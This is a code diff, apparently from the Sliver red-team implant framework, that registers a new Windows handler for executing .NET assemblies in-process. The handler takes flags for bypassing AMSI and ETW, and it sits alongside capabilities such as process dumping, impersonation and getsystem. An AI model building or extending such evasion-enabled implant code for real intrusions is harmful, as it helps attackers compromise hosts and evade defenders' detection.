@@ -49,24 +49,25 @@ var (
 	windowsHandlers = map[uint32]RPCHandler{
 
 		// Windows Only
-		sliverpb.MsgTaskReq:                  taskHandler,
-		sliverpb.MsgProcessDumpReq:           dumpHandler,
-		sliverpb.MsgImpersonateReq:           impersonateHandler,
-		sliverpb.MsgRevToSelfReq:             revToSelfHandler,
-		sliverpb.MsgRunAsReq:                 runAsHandler,
-		sliverpb.MsgInvokeGetSystemReq:       getsystemHandler,
-		sliverpb.MsgInvokeExecuteAssemblyReq: executeAssemblyHandler,
-		sliverpb.MsgInvokeMigrateReq:         migrateHandler,
-		sliverpb.MsgSpawnDllReq:              spawnDllHandler,
-		sliverpb.MsgStartServiceReq:          startService,
-		sliverpb.MsgStopServiceReq:           stopService,
-		sliverpb.MsgRemoveServiceReq:         removeService,
-		sliverpb.MsgEnvReq:                   getEnvHandler,
-		sliverpb.MsgSetEnvReq:                setEnvHandler,
-		sliverpb.MsgUnsetEnvReq:              unsetEnvHandler,
-		sliverpb.MsgExecuteWindowsReq:        executeWindowsHandler,
-		sliverpb.MsgGetPrivsReq:              getPrivsHandler,
-		sliverpb.MsgCurrentTokenOwnerReq:     currentTokenOwnerHandler,
+		sliverpb.MsgTaskReq:                        taskHandler,
+		sliverpb.MsgProcessDumpReq:                 dumpHandler,
+		sliverpb.MsgImpersonateReq:                 impersonateHandler,
+		sliverpb.MsgRevToSelfReq:                   revToSelfHandler,
+		sliverpb.MsgRunAsReq:                       runAsHandler,
+		sliverpb.MsgInvokeGetSystemReq:             getsystemHandler,
+		sliverpb.MsgInvokeExecuteAssemblyReq:       executeAssemblyHandler,
+		sliverpb.MsgInvokeInProcExecuteAssemblyReq: inProcExecuteAssemblyHandler,
+		sliverpb.MsgInvokeMigrateReq:               migrateHandler,
+		sliverpb.MsgSpawnDllReq:                    spawnDllHandler,
+		sliverpb.MsgStartServiceReq:                startService,
+		sliverpb.MsgStopServiceReq:                 stopService,
+		sliverpb.MsgRemoveServiceReq:               removeService,
+		sliverpb.MsgEnvReq:                         getEnvHandler,
+		sliverpb.MsgSetEnvReq:                      setEnvHandler,
+		sliverpb.MsgUnsetEnvReq:                    unsetEnvHandler,
+		sliverpb.MsgExecuteWindowsReq:              executeWindowsHandler,
+		sliverpb.MsgGetPrivsReq:                    getPrivsHandler,
+		sliverpb.MsgCurrentTokenOwnerReq:           currentTokenOwnerHandler,
 
 		// Platform specific
 		sliverpb.MsgIfconfigReq:            ifconfigHandler,
@@ -236,6 +237,26 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 	data, err = proto.Marshal(execAsm)
 	resp(data, err)
 
+}
+
+func inProcExecuteAssemblyHandler(data []byte, resp RPCResponse) {
+	execReq := &sliverpb.InvokeInProcExecuteAssemblyReq{}
+	err := proto.Unmarshal(data, execReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	output, err := taskrunner.InProcExecuteAssembly(execReq.Data, execReq.Arguments, execReq.Runtime, execReq.AmsiBypass, execReq.EtwBypass)
+	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
+	if err != nil {
+		execAsm.Response = &commonpb.Response{
+			Err: err.Error(),
+		}
+	}
+	data, err = proto.Marshal(execAsm)
+	resp(data, err)
 }
 
 func executeWindowsHandler(data []byte, resp RPCResponse) {
